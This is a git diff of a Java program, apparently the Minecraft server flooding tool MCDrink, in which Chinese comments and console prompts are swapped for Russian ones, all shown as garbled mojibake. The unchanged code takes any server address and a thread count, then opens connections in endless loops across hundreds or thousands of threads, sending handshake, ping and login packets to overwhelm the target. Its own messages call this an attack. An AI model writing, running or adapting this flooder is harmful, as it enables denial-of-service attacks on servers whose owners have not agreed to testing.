@@ -24,32 +24,32 @@ public class main {
 	public static long point=0;
 	public static String text="";
 	public static void main(String[] args) {
-		// TODO ×Ô¶¯Éú³ÉµÄ·½·¨´æ¸ù
-		System.out.println("»¶Ó­Ê¹ÓÃMCDrink,×÷Õß:Mr.cacti,github:https://github.com/greyCloudTeam/MCDrink,QQ:3102733279");
-		System.out.println("±¾Èí¼şÀûÓÃmcµÄĞ­Òé,¿ìËÙ¹¥»÷mc1.7¼°ÒÔÉÏµÄ°æ±¾µÄ·şÎñÆ÷(ÒòÎª1.7ÒÔÏÂ°æ±¾µÄ·şÎñÆ÷Ğ­Òé¿ÉÄÜ²»Ò»Ñù),´ïµ½Ñ¹²âµÄÄ¿µÄ");
+		// TODO è‡ªåŠ¨ç”Ÿæˆçš„æ–¹æ³•å­˜æ ¹
+		System.out.println("ĞŸĞµÑ€ĞµĞ²Ñ‘Ğ» FLICK_YT:Mr.cacti,github:https://github.com/greyCloudTeam/MCDrink,QQ:3102733279");
+		System.out.println("Ğ­Ñ‚Ğ° Ğ¿Ñ€Ğ¾Ğ³Ñ€Ğ°Ğ¼Ğ¼Ğ° Ñ€Ğ°Ğ±Ğ¾Ñ‚Ğ°ĞµÑ‚ Ğ½Ğ° Ğ²ĞµÑ€ÑĞ¸ÑÑ… Ğ¾Ñ‚ 1.7");
 		Scanner s=new Scanner(System.in);
-		System.out.print("ÇëÊäÈë·şÎñÆ÷ÍêÕûµØÖ·(Èç127.0.0.1:25565):");
+		System.out.print("ĞŸĞ¾Ğ¶Ğ°Ğ»ÑƒĞ¹ÑÑ‚Ğ°, Ğ²Ğ²ĞµĞ´Ğ¸Ñ‚Ğµ Ğ¿Ğ¾Ğ»Ğ½Ñ‹Ğ¹ Ğ°Ğ´Ñ€ĞµÑ ÑĞµÑ€Ğ²ĞµÑ€Ğ° (Ğ½Ğ°Ğ¿Ñ€Ğ¸Ğ¼ĞµÑ€) 127.0.0.1:25565):");
 		String ip=s.nextLine();
-		System.out.print("ÇëÊäÈëÏß³ÌÊıÁ¿(¿´cpu£¬1000ÒÔÉÏĞ§¹û×îºÃ):");
+		System.out.print("ĞŸĞ¾Ğ¶Ğ°Ğ»ÑƒĞ¹ÑÑ‚Ğ°, Ğ²Ğ²ĞµĞ´Ğ¸Ñ‚Ğµ ĞºĞ¾Ğ»Ğ¸Ñ‡ĞµÑÑ‚Ğ²Ğ¾ Ğ¿Ğ¾Ñ‚Ğ¾ĞºĞ¾Ğ² (Ğ² Ğ·Ğ°Ğ²Ğ¸ÑĞ¸Ğ¼Ğ¾ÑÑ‚Ğ¸ Ğ¾Ñ‚ Ğ¿Ñ€Ğ¾Ñ†ĞµÑÑĞ¾Ñ€Ğ°, Ğ»ÑƒÑ‡ÑˆĞµ Ğ²ÑĞµĞ³Ğ¾ Ñ€Ğ°Ğ±Ğ¾Ñ‚Ğ°ĞµÑ‚ Ğ±Ğ¾Ğ»ĞµĞµ 1000):");
 		String threadNum=s.nextLine();
 		main.part1=ip.split(":");
 		main.port=Integer.parseInt(part1[1]);
 		int num=Integer.parseInt(threadNum);
-		System.out.print("ÇëÊäÈë¸ÉÈÅ×Ö·û£¬Ëæ±ã¼¸¸öÓ¢ÎÄ»òÊı×Ö¾Í¿ÉÒÔ£¬µ«ÊÇ²»ÒªÌ«¶à£¬²»ÄÜÊÇÖĞÎÄ£¡:");
+		System.out.print("ĞŸĞ¾Ğ¶Ğ°Ğ»ÑƒĞ¹ÑÑ‚Ğ°, Ğ²Ğ²ĞµĞ´Ğ¸Ñ‚Ğµ Ğ»ÑĞ±Ñ‹Ğµ ÑĞ¸Ğ¼Ğ²Ğ¾Ğ»Ñ‹, Ğ²ÑĞµĞ³Ğ¾ Ğ½ĞµÑĞºĞ¾Ğ»ÑŒĞºĞ¾ Ğ°Ğ½Ğ³Ğ»Ğ¸Ğ¹ÑĞºĞ¸Ñ… Ğ¸Ğ»Ğ¸ Ñ†Ğ¸Ñ„Ñ€, Ğ½Ğ¾ Ğ½Ğµ ÑĞ»Ğ¸ÑˆĞºĞ¾Ğ¼ Ğ¼Ğ½Ğ¾Ğ³Ğ¾, Ğ½Ğµ ĞºĞ¸Ñ‚Ğ°Ğ¹ÑĞºĞ¸Ğµ!:");
 		text=s.nextLine();
-		System.out.println("ÕıÔÚ´æÈë»º´æ");
+		System.out.println("Ğ”Ğ°Ğ½Ğ½Ñ‹Ğµ Ğ·Ğ°Ğ¿Ğ¸ÑĞ°Ğ½Ñ‹");
 		
 		
-		//ÎÕÊÖ°üÊı¾İÁ÷³õÊ¼»¯
+		//æ¡æ‰‹åŒ…æ•°æ®æµåˆå§‹åŒ–
 		ByteArrayOutputStream b ;
 		DataOutputStream handshake;
-		//µÚÒ»´ÎÎÕÊÖ
+		//ç¬¬ä¸€æ¬¡æ¡æ‰‹
 		try {
 			b= new ByteArrayOutputStream();
 			handshake = new DataOutputStream(b);
 			handshake.write(0x00);
-			main.writeVarInt(handshake,-1);//°æ±¾ºÅÎ´Öª
-			main.writeVarInt(handshake,main.part1[0].length()); //ipµØÖ·³¤¶È
+			main.writeVarInt(handshake,-1);//ç‰ˆæœ¬å·æœªçŸ¥
+			main.writeVarInt(handshake,main.part1[0].length()); //ipåœ°å€é•¿åº¦
 			handshake.writeBytes(main.part1[0]); //ip
 			handshake.writeShort(main.port); //port
 			main.writeVarInt(handshake, 1); //state (1 for handshake)
@@ -67,29 +67,29 @@ public class main {
 			pack=b.toByteArray();
 			
 		} catch (IOException e) {
-			// TODO ×Ô¶¯Éú³ÉµÄ catch ¿é
+			// TODO è‡ªåŠ¨ç”Ÿæˆçš„ catch å—
 			e.printStackTrace();
-		}//ÏÈÎÕÊÖ
+		}//å…ˆæ¡æ‰‹
 		
-		System.out.println("ÕıÔÚÌ½²â°æ±¾..");
+		System.out.println("ĞŸÑ€Ğ¾Ğ±Ğ½Ğ°Ñ Ğ²ĞµÑ€ÑĞ¸Ñ..");
 		boolean lock=true;
 		try {
 				Socket s1=new Socket(main.part1[0],main.port);
-				//Á÷×¼±¸
+				//æµå‡†å¤‡
 				InputStream is=s1.getInputStream();
 				DataInputStream di=new DataInputStream(is);
 				OutputStream os=s1.getOutputStream();
 				DataOutputStream dos=new DataOutputStream(os);
 				
-				//ÎÕÊÖ
+				//æ¡æ‰‹
 				main.writeVarInt(dos, main.hand.length); //prepend size
 				dos.write(main.hand); //write handshake packet
-				//¸úĞ¡°ü
+				//è·Ÿå°åŒ…
 				main.writeVarInt(dos, main.pack.length); //prepend size
 				dos.write(main.pack); //write handshake packet
 				dos.flush();
 				
-				main.data=main.data+main.readVarInt(di);//¶Á°ü´óĞ¡
+				main.data=main.data+main.readVarInt(di);//è¯»åŒ…å¤§å°
 				main.readVarInt(di);
 				byte[] temp1=new byte[main.readVarInt(di)];
 				di.readFully(temp1);
@@ -98,7 +98,7 @@ public class main {
 				JsonParser json=new JsonParser();
 	            JsonElement part5 = json.parse(motdT);
 	            JsonElement part6=part5.getAsJsonObject().get("version");
-	            System.out.println("·şÎñÆ÷°æ±¾:"+part6.getAsJsonObject().get("name").getAsString()+",Ğ­Òé°æ±¾ºÅ:"+part6.getAsJsonObject().get("protocol").getAsInt());
+	            System.out.println("Ğ’ĞµÑ€ÑĞ¸Ñ ÑĞµÑ€Ğ²ĞµÑ€Ğ°:"+part6.getAsJsonObject().get("name").getAsString()+",ĞĞ¾Ğ¼ĞµÑ€ Ğ²ĞµÑ€ÑĞ¸Ğ¸:"+part6.getAsJsonObject().get("protocol").getAsInt());
 	            version=part6.getAsJsonObject().get("protocol").getAsInt();
 				
 				di.close();
@@ -109,14 +109,14 @@ public class main {
 		} catch (Exception e) {
 			lock=false;
 			e.printStackTrace();
-			System.out.print("Ì½²âÊ§°Ü£¬ÇëÊÖ¶¯ÊäÈëĞ­Òé°æ±¾ºÅ:");
+			System.out.print("ĞĞ±Ğ½Ğ°Ñ€ÑƒĞ¶ĞµĞ½Ğ¸Ğµ Ğ½Ğµ ÑƒĞ´Ğ°Ğ»Ğ¾ÑÑŒ, Ğ¿Ğ¾Ğ¶Ğ°Ğ»ÑƒĞ¹ÑÑ‚Ğ°, Ğ²Ñ€ÑƒÑ‡Ğ½ÑƒÑ Ğ²Ğ²ĞµĞ´Ğ¸Ñ‚Ğµ Ğ½Ğ¾Ğ¼ĞµÑ€ Ğ²ĞµÑ€ÑĞ¸Ğ¸:");
 			version=Integer.parseInt(s.nextLine());
 		}
 		if(lock) {
-			System.out.print("¸Õ²ÅÌ½²âµ½µÄÊÇ·ñÊÇÕæµÄĞ­Òé°æ±¾ºÅ£¿[y/n]:");
+			System.out.print("Ğ¢Ğ¾Ğ»ÑŒĞºĞ¾ Ñ‡Ñ‚Ğ¾ Ğ¾Ğ±Ğ½Ğ°Ñ€ÑƒĞ¶ĞµĞ½ Ñ€ĞµĞ°Ğ»ÑŒĞ½Ñ‹Ğ¹ Ğ½Ğ¾Ğ¼ĞµÑ€ Ğ²ĞµÑ€ÑĞ¸Ğ¸, Ğ²ĞµÑ€Ğ½Ğ¾ï¼Ÿ[y/n]:");
 			String temp=s.nextLine();
 			if((!temp.equals("y"))&&(!temp.equals("Y"))) {
-				System.out.print("ÇëÊäÈëÕıÈ·µÄĞ­Òé°æ±¾ºÅ:");
+				System.out.print("ĞŸĞ¾Ğ¶Ğ°Ğ»ÑƒĞ¹ÑÑ‚Ğ°, Ğ²Ğ²ĞµĞ´Ğ¸Ñ‚Ğµ Ğ¿Ñ€Ğ°Ğ²Ğ¸Ğ»ÑŒĞ½Ñ‹Ğ¹ Ğ½Ğ¾Ğ¼ĞµÑ€ Ğ²ĞµÑ€ÑĞ¸Ğ¸:");
 				version=Integer.parseInt(s.nextLine());
 			}
 		}
@@ -124,8 +124,8 @@ public class main {
 			b= new ByteArrayOutputStream();
 			handshake = new DataOutputStream(b);
 			handshake.write(0x00);
-			main.writeVarInt(handshake,version);//°æ±¾ºÅÎ´Öª
-			main.writeVarInt(handshake,main.part1[0].length()); //ipµØÖ·³¤¶È
+			main.writeVarInt(handshake,version);//ç‰ˆæœ¬å·æœªçŸ¥
+			main.writeVarInt(handshake,main.part1[0].length()); //ipåœ°å€é•¿åº¦
 			handshake.writeBytes(main.part1[0]); //ip
 			handshake.writeShort(main.port); //port
 			main.writeVarInt(handshake, 2); //state (1 for handshake)
@@ -133,14 +133,14 @@ public class main {
 		}catch(Exception e) {
 			e.printStackTrace();
 		}
-		System.out.println("×¼±¸Íê±Ï,ÕıÔÚÆô¶¯Ïß³Ì,³¤Ê±¼äÏÔÊ¾\"[AnotherThread]>0byte\"ĞÅÏ¢ÔòÎª¹¥»÷Ê§°Ü");
+		System.out.println("Ğ“Ğ¾Ñ‚Ğ¾Ğ²Ğ¾, Ğ¿Ğ¾Ñ‚Ğ¾Ğº Ğ·Ğ°Ğ¿ÑƒÑĞºĞ°ĞµÑ‚ÑÑ, Ğ¸ Ğ¾Ğ½ Ğ±ÑƒĞ´ĞµÑ‚ Ğ¾Ñ‚Ğ¾Ğ±Ñ€Ğ°Ğ¶Ğ°Ñ‚ÑŒÑÑ Ğ² Ñ‚ĞµÑ‡ĞµĞ½Ğ¸Ğµ Ğ´Ğ»Ğ¸Ñ‚ĞµĞ»ÑŒĞ½Ğ¾Ğ³Ğ¾ Ğ²Ñ€ĞµĞ¼ĞµĞ½Ğ¸\"[Ğ‘Ğ¾Ñ‚]>0byte\"Ğ•ÑÑ‚ÑŒ Ğ¸Ğ½Ñ„Ğ¾Ñ€Ğ¼Ğ°Ñ†Ğ¸Ñ, Ñ‡Ñ‚Ğ¾ Ğ°Ñ‚Ğ°ĞºĞ° Ğ¿Ñ€Ğ¾Ğ²Ğ°Ğ»Ğ¸Ğ»Ğ°ÑÑŒ");
 		Runnable thread4 = new Thread4(); 
 		Thread thread3 = new Thread(thread4);
-		thread3.start();//Æô¶¯½âÎöÏß³Ì
+		thread3.start();//å¯åŠ¨è§£æçº¿ç¨‹
 		for(int i=1;i<=num;i++) {
 			Runnable thread1 = new Thread1(); 
 			Thread thread2 = new Thread(thread1);
-			thread2.start();//Æô¶¯½âÎöÏß³Ì
+			thread2.start();//å¯åŠ¨è§£æçº¿ç¨‹
 		}
 		
 	}
@@ -172,28 +172,28 @@ class Thread1 implements Runnable {
 			while(true) {
 				try {
 				Socket s=new Socket(main.part1[0],main.port);
-				//Á÷×¼±¸
+				//æµå‡†å¤‡
 				InputStream is=s.getInputStream();
 				DataInputStream di=new DataInputStream(is);
 				OutputStream os=s.getOutputStream();
 				DataOutputStream dos=new DataOutputStream(os);
 				int temp;
 				
-				//ÎÕÊÖ
+				//æ¡æ‰‹
 				main.writeVarInt(dos, main.hand.length); //prepend size
 				dos.write(main.hand); //write handshake packet
-				//¸úĞ¡°ü
+				//è·Ÿå°åŒ…
 				main.writeVarInt(dos, main.pack.length); //prepend size
 				dos.write(main.pack); //write handshake packet
 				dos.flush();
 				
-				main.data=main.data+main.readVarInt(di);//¶Á°ü´óĞ¡
+				main.data=main.data+main.readVarInt(di);//è¯»åŒ…å¤§å°
 				main.readVarInt(di);
 				byte[] temp1=new byte[main.readVarInt(di)];
 				di.readFully(temp1);
 				
 				try {
-					//ping°ü
+					//pingåŒ…
 					main.writeVarInt(dos, main.ping.length); //prepend size
 					dos.write(main.ping); //write handshake packet
 					dos.flush();
@@ -212,12 +212,12 @@ class Thread1 implements Runnable {
 				s.close();
 				
 				s=new Socket(main.part1[0],main.port);
-				//Á÷×¼±¸
+				//æµå‡†å¤‡
 				is=s.getInputStream();
 				di=new DataInputStream(is);
 				os=s.getOutputStream();
 				dos=new DataOutputStream(os);
-				//µÚ¶ş´ÎÎÕÊÖ
+				//ç¬¬äºŒæ¬¡æ¡æ‰‹
 				main.writeVarInt(dos, main.login.length); //prepend size
 				dos.write(main.login); //write handshake packet
 				ByteArrayOutputStream b ;
@@ -242,14 +242,14 @@ class Thread1 implements Runnable {
 					di.readFully(lj);
 					}catch(Exception e) {break;}
 				}
-				//main.data=main.data+main.readVarInt(di);<--ÀÏ×Ó²»ÒªÕâ¸öÊı¾İÁË
+				//main.data=main.data+main.readVarInt(di);<--è€å­ä¸è¦è¿™ä¸ªæ•°æ®äº†
 				di.close();
 				is.close();
 				dos.close();
 				os.close();
 				s.close();
 				} catch (Exception e) {
-					// TODO ×Ô¶¯Éú³ÉµÄ catch ¿é
+					// TODO è‡ªåŠ¨ç”Ÿæˆçš„ catch å—
 					//e.printStackTrace();
 					main.killT++;
 					//e.printStackTrace();
@@ -266,26 +266,26 @@ class Thread4 implements Runnable {
 				Thread.sleep(3000);
 				if(main.data>=1024*1024*1024) {
 					double a=main.data/(1024.0*1024.0*1024.0);
-					System.out.println("[AnotherThread]>"+a+"kb,"+main.killT+"thread");
+					System.out.println("[Ğ‘Ğ¾Ñ‚]>"+a+"kb,"+main.killT+"thread");
 					continue;
 				}
 				if(main.data>=1024*1024) {
 					double a=main.data/(1024.0*1024.0);
-					System.out.println("[AnotherThread]>"+a+"mb,"+main.killT+"thread");
+					System.out.println("[Ğ‘Ğ¾Ñ‚]>"+a+"mb,"+main.killT+"thread");
 					continue;
 				}
 				if(main.data>=1024) {
 					double a=main.data/1024.0;
-					System.out.println("[AnotherThread]>"+a+"kb,"+main.killT+"thread");
+					System.out.println("[Ğ‘Ğ¾Ñ‚]>"+a+"kb,"+main.killT+"thread");
 					continue;
 				}
 				if(main.data<1024) {
-					System.out.println("[AnotherThread]>"+main.data+"byte,"+main.killT+"thread");
+					System.out.println("[Ğ‘Ğ¾Ñ‚]>"+main.data+"byte,"+main.killT+"thread");
 					continue;
 				}
 			}
 		} catch (InterruptedException e) {
-			// TODO ×Ô¶¯Éú³ÉµÄ catch ¿é
+			// TODO è‡ªåŠ¨ç”Ÿæˆçš„ catch å—
 			e.printStackTrace();
 		}
 		
